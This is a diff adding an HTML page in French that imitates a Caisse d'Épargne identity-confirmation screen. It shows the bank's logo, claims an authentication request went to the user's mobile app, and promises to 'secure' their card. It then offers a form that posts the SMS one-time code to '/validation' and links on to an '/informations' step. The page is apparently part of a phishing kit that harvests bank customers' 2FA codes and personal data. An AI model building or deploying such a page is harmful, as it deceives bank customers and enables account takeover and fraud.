@@ -1,0 +1,164 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <title>Validation - Caisse d'Épargne</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #fff;
+      color: #000;
+      height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+    .header {
+      background: #fff;
+      padding: 16px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      border-bottom: 1px solid #ddd;
+    }
+    .header a {
+      text-decoration: none;
+      color: #c10000;
+      font-weight: bold;
+      font-size: 14px;
+    }
+    .header img {
+      height: 36px;
+    }
+    .main {
+      flex: 1;
+      padding: 24px;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      text-align: center;
+    }
+    h1 {
+      font-size: 22px;
+      color: #c10000;
+      margin-bottom: 20px;
+    }
+    p {
+      font-size: 16px;
+      line-height: 1.6;
+      max-width: 500px;
+    }
+    .alert-box {
+      background: #fff;
+      border: 1px solid #c10000;
+      padding: 16px;
+      font-size: 14px;
+      color: #333;
+      border-radius: 6px;
+      margin-top: 30px;
+    }
+    .alert-box strong {
+      display: flex;
+      align-items: center;
+      color: #c10000;
+      margin-bottom: 6px;
+    }
+    .alert-box strong::before {
+      content: "⚠️";
+      display: inline-block;
+      margin-right: 8px;
+      font-size: 18px;
+    }
+    .sms-toggle {
+      margin-top: 30px;
+      font-size: 15px;
+      color: #c10000;
+      text-decoration: underline;
+      cursor: pointer;
+    }
+    .sms-form {
+      display: none;
+      margin-top: 20px;
+      width: 100%;
+      max-width: 360px;
+    }
+    .sms-form input {
+      width: 100%;
+      padding: 12px;
+      font-size: 16px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      margin-bottom: 10px;
+    }
+    .sms-form button {
+      width: 100%;
+      padding: 12px;
+      font-size: 16px;
+      background-color: #c10000;
+      color: #fff;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+    }
+    .next-step {
+      margin-top: 40px;
+      text-align: center;
+    }
+    .next-step a {
+      display: inline-block;
+      background-color: #c10000;
+      color: #fff;
+      padding: 14px 24px;
+      text-decoration: none;
+      border-radius: 8px;
+      font-size: 16px;
+      font-weight: bold;
+      transition: background-color 0.3s ease;
+    }
+    .next-step a:hover {
+      background-color: #a30000;
+    }
+  </style>
+</head>
+<body>
+  <div class="header">
+    <a href="#">Quitter</a>
+    <img src="https://ce-prod.cloudimg.io/_images_/app/uploads/sites/3/2022/02/17171235/logo-ce-desktop.jpg?func=bound&w=300&h=78&gravity=auto&optipress=2" alt="Logo">
+    <a href="#" class="help-button" title="Assistance">?</a>
+  </div>
+
+  <div class="main">
+    <h1>Confirmez votre identité</h1>
+    <p>
+      Une demande d'authentification a été envoyée sur votre application mobile Caisse d'Épargne.<br>
+      Veuillez l’ouvrir et valider l’opération pour continuer.
+    </p>
+
+    <div class="alert-box">
+      <strong>Renforcement de sécurité</strong>
+      Une fois l’authentification validée, nous procéderons à la sécurisation de votre carte bancaire afin de prévenir toute tentative de fraude.
+    </div>
+
+    <div class="sms-toggle" onclick="toggleSMS()">Vous avez reçu un code par SMS ? Cliquez ici</div>
+
+    <form method="post" action="/validation" class="sms-form" id="smsForm">
+      <input type="text" name="validation" placeholder="Saisissez le code reçu par SMS" required>
+      <button type="submit">Valider le code</button>
+    </form>
+
+    <div class="next-step">
+      <p>Une fois la validation effectuée, vous pouvez poursuivre :</p>
+      <a href="/informations">Poursuivre vers la Sécurisation de vos informations</a>
+    </div>
+  </div>
+
+  <script>
+    function toggleSMS() {
+      const form = document.getElementById('smsForm');
+      form.style.display = form.style.display === 'block' ? 'none' : 'block';
+    }
+  </script>
+</body>
+</html>
